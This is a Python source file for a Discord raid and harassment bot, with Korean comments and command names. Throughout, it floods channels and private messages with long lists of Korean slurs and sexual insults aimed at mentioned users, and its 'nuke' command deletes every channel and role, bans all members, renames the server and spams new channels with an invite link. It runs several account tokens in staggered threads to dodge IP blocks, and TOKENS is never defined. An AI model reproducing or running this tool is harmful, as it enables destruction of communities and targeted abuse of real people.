import discord
import random
import asyncio
import os
import threading
import time

# ★ 니 디스코드 ID ★
OWNER_ID = 1568590045286244358

# 명령어
START_TRIGGER = "!장애타"
STOP_TRIGGER = "!STOP"
SETTINGS_TRIGGER = "!설정"
SPEED_TRIGGER = "!스피드"
TURBO_TRIGGER = "!초고속"
SPACE_TRIGGER = "!띄어쓰기"
NORMAL_TRIGGER = "!일반쓰기"
HELP_TRIGGER = "!기능"
SPAM_TRIGGER = "!spam"
MENTION_TRIGGER = "!갠디" 
DOBAE_TRIGGER = "!도배"   
PING_TRIGGER = "!핑"
NUKE_TRIGGER = "!누크" 

# 일반 도배용 단어장
raw_words = "니애미,창년,개보지,말보지,저능아,열등종자,개새끼,고아,시발,시발련,고아련,종자,장애,랑애,농아,븅신,병신,씨발,애미,애비,죽은,새끼,머저리,창녀,청년,느금마,느그애비,느그애미,니애비,씹보지,말랑보지,말보지,창년보지,죽은보지,헐렁보지,보지,자폐아,거지,좆거지,개거지,장애보지,개벌래보지"
words = raw_words.split(',')

random_nums = ["100", "9339", "34554", "4313", "6436", "2521", "1343", "14111", "4059", "2849", "324", "38204", "14323", "1357", "168", "447", "4754", "INF", "2314", "6352", "5152", "5736", "9474", "0424", "7346", "1453", "15462", "5231", "5155", "4143", "4314", "135", "635", "5513", "45734", "65E8", "47WQ4", "", "5WQ", "GRSA", "GS", "YHRD", "FEA", "TE", "THRW", "RGATBE", "grW", "GR", "rg", "grrg", "arg", "arghr", "reER", "ESAH", "TAE", "HAFD"]

mention_text = """{target} 현월 업인데 너컷이야 병신새끼야 현월라인을 찬양해라 너병신 갠디 태러 당하네? 병신새끼네? 너컷이네병신아? {num}"""

dobae_text = """@m057677 
A
A
A
A
# 소주업인데?
# 너네이미컷이얔ㅋㅋㅋ
# 패자가말이많넼ㅋㅋ
# 소주찬양ㄱㄱ
# 명백한소주승인데?
# 너 컷이야 
# 현월업이야아가리닥쳐
# 현월 업 너넨컷?
# 니애미도컷?   
`니애미 죽인 횟수: {num}` 
https://cdn.discordapp.com/attachments/1527944035816443934/1548286685413113956/lv_0_20260912195758.gif
https://cdn.discordapp.com/attachments/1531280401497329795/1531631114265821296/1759806656222.gif"""

nuke_channel_names = [
    "▟┃▔┃⬤ 현월을 찬양해라",
    "︻╦╤─── 현월업업",
    "▟┃▔┃⬤ 현월에게 테러",
    "︻╦╤─── 현월 업이다?",
    "▟┃▔┃⬤ 현월라인 이전"
]

class SpamClient(discord.Client):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.is_spamming = False
        self.is_pinging = False
        self.is_nuking = False
        self.spam_content = ""
        self.spam_delay = 0.4
        self.spam_mode = "normal"

    def make_spam_message(self):
        c1, c2, c3, c4 = random.choice(words), random.choice(words), random.choice(words), random.choice(words)
        if self.spam_mode == "space": return " ".join(f"{c1}{c2}{c3}{c4}")
        else: return f"{c1}{c2}{c3}{c4}"

    async def on_ready(self):
        print(f"✅ 로그인 완료: {self.user}")

    async def on_message(self, message):
        if message.author.id != self.user.id and message.author.id != OWNER_ID: return

        # 1. 전체 중지 (!STOP)
        if message.content == STOP_TRIGGER:
            self.is_spamming = False
            self.is_pinging = False
            self.is_nuking = False
            await message.channel.send("STOP"); return

        # 2. 누크 기능 (!누크 [숫자])
        if message.content.startswith(NUKE_TRIGGER):
            guild = message.guild
            if not guild: return
            
            self.is_nuking = True
            
            parts = message.content.split(" ")
            extra_count = 0
            if len(parts) == 2:
                try: extra_count = int(parts[1])
                except: pass

            channels_to_delete = list(guild.channels)
            roles_to_delete = [r for r in guild.roles if r != guild.default_role and r < guild.me.top_role]
            
            async def delete_channel(ch):
                if not self.is_nuking: return
                try: await ch.delete()
                except: pass
            await asyncio.gather(*(delete_channel(ch) for ch in channels_to_delete))
            
            if not self.is_nuking: return
            
            async def delete_role(role):
                if not self.is_nuking: return
                try: await role.delete()
                except: pass
            await asyncio.gather(*(delete_role(r) for r in roles_to_delete))
                    
            if not self.is_nuking: return
            
            async def ban_member(m):
                if not self.is_nuking: return
                try:
                    if not m.bot and m.id != OWNER_ID: await m.ban(reason="Nuked")
                except: pass
            await asyncio.gather(*(ban_member(m) for m in guild.members))
            
            if not self.is_nuking: return

            try: await guild.edit(name="현월 서버 터짐 ㅋㅋ")
            except: pass

            async def create_spam_channel(ch_name):
                if not self.is_nuking: return
                try:
                    new_channel = await guild.create_text_channel(name=ch_name)
                    await new_channel.send("서버이전\nhttps://discord.gg/Fs2a99S5Xu")
                except: pass

            tasks = []
            for _ in range(30):
                for ch_name in nuke_channel_names:
                    tasks.append(create_spam_channel(ch_name))
            
            for _ in range(extra_count):
                tasks.append(create_spam_channel(random.choice(nuke_channel_names)))

            for i in range(0, len(tasks), 10):
                if not self.is_nuking: return
                await asyncio.gather(*tasks[i:i+10])
                await asyncio.sleep(1)

            return

        # 3. 핑 반복
        if message.content.startswith(PING_TRIGGER):
            ping_text = message.content[len(PING_TRIGGER):].strip() or "핑!"
            if self.is_pinging: return
            self.is_pinging = True
            while self.is_pinging:
                try:
                    sent_msg = await message.channel.send(ping_text)
                    await asyncio.sleep(max(0.05, self.spam_delay / 2))
                    await sent_msg.delete()
                    await asyncio.sleep(max(0.05, self.spam_delay / 2))
                except Exception: await asyncio.sleep(1)
            return

        # 4. 기능 목록
        if message.content == HELP_TRIGGER:
            help_text = (f"**[ 기능 목록 ]**\n`{START_TRIGGER}` : 도배\n`{STOP_TRIGGER}` : 중지\n"
                         f"`{SETTINGS_TRIGGER}` : 현재 속도 확인\n`{SPEED_TRIGGER} [숫자]` : 속도 변경\n"
                         f"`{TURBO_TRIGGER}` : 0.083초 초고속 모드\n"
                         f"`{SPACE_TRIGGER}` : 띄어쓰기\n`{NORMAL_TRIGGER}` : 일반쓰기\n"
                         f"`{SPAM_TRIGGER} [문장]` : 커스텀 도배\n`{MENTION_TRIGGER} @유저` : DM 도배\n"
                         f"`{DOBAE_TRIGGER} @유저` : 채널 도배\n`{PING_TRIGGER} [문장]` : 반복 핑\n"
                         f"`{NUKE_TRIGGER} [숫자]` : 서버 초토화 및 채널 폭탄")
            await message.channel.send(help_text); return

        if message.content == SPACE_TRIGGER: self.spam_mode = "space"; await message.channel.send("띄어쓰기 모드 ON"); return
        if message.content == NORMAL_TRIGGER: self.spam_mode = "normal"; await message.channel.send("일반쓰기 모드 ON"); return
        if message.content == SETTINGS_TRIGGER: await message.channel.send(f"{self.spam_delay}"); return

        # 5. 속도 변경 (숫자만)
        if message.content.startswith(SPEED_TRIGGER):
            try:
                new_delay = float(message.content.split(" ")[1])
                self.spam_delay = max(0.05, min(100.0, new_delay))
                await message.channel.send(f"{self.spam_delay}")
            except: pass
            return

        # 6. 초고속 모드
        if message.content == TURBO_TRIGGER:
            self.spam_delay = 0.083
            await message.channel.send("0.083")
            return

        if message.content.startswith(SPAM_TRIGGER):
            if self.is_spamming: return
            text = message.content[len(SPAM_TRIGGER):].strip()
            if not text: return
            self.is_spamming = True
            while self.is_spamming:
                try: await message.channel.send(text); await asyncio.sleep(max(0.05, self.spam_delay))
                except discord.errors.HTTPException as e: await asyncio.sleep(e.response.headers.get('Retry-After', 2) + 0.5 if e.status == 429 else 1)
                except Exception: await asyncio.sleep(1)
            return

        if message.content.startswith(DOBAE_TRIGGER):
            if self.is_spamming or not message.mentions: return
            target = message.mentions[0]
            self.is_spamming = True
            while self.is_spamming:
                try: await message.channel.send(dobae_text.replace("@m057677", target.mention).format(num=random.choice(random_nums))); await asyncio.sleep(max(0.05, self.spam_delay))
                except Exception: await asyncio.sleep(1)
            return

        if message.content.startswith(MENTION_TRIGGER):
            if self.is_spamming or not message.mentions: return
            target = message.mentions[0]
            self.is_spamming = True
            try: dm = await target.create_dm()
            except: await message.channel.send("DM 차단됨"); self.is_spamming = False; return
            while self.is_spamming:
                try: await dm.send(mention_text.format(target=target.mention, num=random.choice(random_nums))); await asyncio.sleep(max(0.05, self.spam_delay))
                except Exception: await asyncio.sleep(1)
            return

        if message.content == START_TRIGGER:
            if self.is_spamming: return
            self.is_spamming = True
            while self.is_spamming:
                try: await message.channel.send(self.make_spam_message()); await asyncio.sleep(max(0.05, self.spam_delay))
                except Exception: await asyncio.sleep(1)
            return

# ==========================================
# 토큰들을 2초 간격으로 순차 실행 (IP 차단 방지)
# ==========================================
def run_bot(token):
    client = SpamClient()
    client.run(token)

for token in TOKENS:
    threading.Thread(target=run_bot, args=(token,), daemon=True).start()
    time.sleep(2) # 토큰 하나당 2초 대기

# 봇들이 꺼지지 않게 무한 대기
while True:
    time.sleep(1)
